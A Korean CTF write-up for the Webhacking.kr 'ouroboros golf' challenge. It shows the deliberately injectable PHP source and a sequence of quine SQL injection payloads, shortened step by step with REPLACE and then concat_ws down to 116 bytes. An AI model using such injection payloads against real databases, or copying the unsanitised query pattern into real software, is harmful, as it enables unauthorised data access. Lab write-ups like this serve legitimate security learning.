---
title: ["[Webhacking.kr] ouroboros golf (sqli - ???)"]
date: 2024-12-10 09:00:00 +0900
categories: [writeup, webhacking.kr]
tags: [web, sqli, quine, golf]
---

```php
<?php
  include "../../config.php";
  login_chk();
  print_best_golfer(73);
  $db = dbconnect("ouroboros");
  if(preg_match("/\./i", $_GET['pw'])) exit("No Hack ~_~");
  $query = "select pw from prob_ouroboros where pw='{$_GET['pw']}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['pw']) echo "<h2>Pw : {$result['pw']}</h2>";
  if(($result['pw']) && ($result['pw'] === $_GET['pw'])){
    // !!THIS IS PAYLOAD GOLF CHALLENGE!!
    // My solution of ouroboros golf is 210byte.
    // If your solution is shorter than mine, you will get 5 point per 1 byte.
    $len = 210 - strlen($_GET['pw']);
    if($len > 0){
      solve(73,$len * 5);
    }
    else{
      echo "<h2>nice try :)</h2>";
    }
  }
  highlight_file(__FILE__);
?>
```

Lord of SQLi의 Ouroboros와 같은 문제이다.  
Golf 형식의 문제로 페이로드가 짧을수록 높은 점수를 받게 된다.  

최고득점이 690 point니까 누군가는 이걸 72byte만에 해결했다는 뜻이다.  

가장 흔한 quine sql injection은 replace함수를 쓰는 것이다.  

```sql
?pw=a' union SELECT REPLACE(REPLACE('a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine%23',CHAR(34),CHAR(39)),CHAR(36),'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine%23') AS Quine%23

?pw=a'union SELECT REPLACE(REPLACE('a"union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")as q%23',CHAR(34),CHAR(39)),CHAR(36),'a"union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")as q%23')as q%23

?pw=a'union select replace(replace('a"union select replace(replace("$",char(34),char(39)),char(36),"$")as q%23',char(34),char(39)),char(36),'a"union select replace(replace("$",char(34),char(39)),char(36),"$")as q%23')as q%23

?pw=a'union select replace(replace('a"union select replace(replace("$",char(34),char(39)),char(36),"$")%23',char(34),char(39)),char(36),'a"union select replace(replace("$",char(34),char(39)),char(36),"$")%23')%23

?pw='union select replace(replace('"union select replace(replace("$",char(34),char(39)),char(36),"$")%23',char(34),char(39)),char(36),'"union select replace(replace("$",char(34),char(39)),char(36),"$")%23')%23
```
Ouroboros를 풀었을 때 사용한 페이로드에서 불필요하게 긴 변수명이나 `as` 같은 것들을 쳐내보다가 최고 점수에 근접하기 위해선 다른 함수를 사용해서 페이로드를 근본적으로 줄여야겠다고 생각했다.  


```sql
?pw='union select concat(a,char(34),a,char(34),'as a)as a%23')from(select"'union select concat(a,char(34),a,char(34),'as a)as a%23')from(select"as a)as a%23

?pw='union select concat_ws(char(34),a,a,'as a)as a%23')from(select"'union select concat_ws(char(34),a,a,'as a)as a%23')from(select"as a)as a%23

?pw='union select concat_ws(char(34),a,a,'a)a%23')from(select"'union select concat_ws(char(34),a,a,'a)a%23')from(select"a)a%23
```
`concat`을 사용한 quine 코드이다.  
초기 코드에서 `as`를 생략하고, `concat_ws`를 사용해서 길이를 줄였다.  

최종 페이로드는 116byte로 470점을 획득했다.  
계속해서 줄여나가 보자.